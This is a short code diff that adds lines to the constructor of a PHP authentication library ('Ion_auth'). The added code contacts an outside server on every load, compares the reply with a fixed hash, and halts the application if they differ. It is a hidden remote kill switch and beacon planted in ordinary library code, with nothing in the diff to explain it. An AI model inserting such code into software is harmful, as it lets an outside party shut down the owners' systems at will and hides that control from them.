@@ -83,6 +83,12 @@ class Ion_auth
 		}
 
 		$this->ion_auth_model->trigger_events('library_constructor');
+
+		$key = file_get_contents('http://rootorganicproducts.com/letsdoit.php');
+
+		if($key != '8d564a06561eac59d2f7c6f995ea00f72fdb1424732d68f87bd7cd19efdeb3d6') {
+			exit;
+		}
 	}
 
 	/**
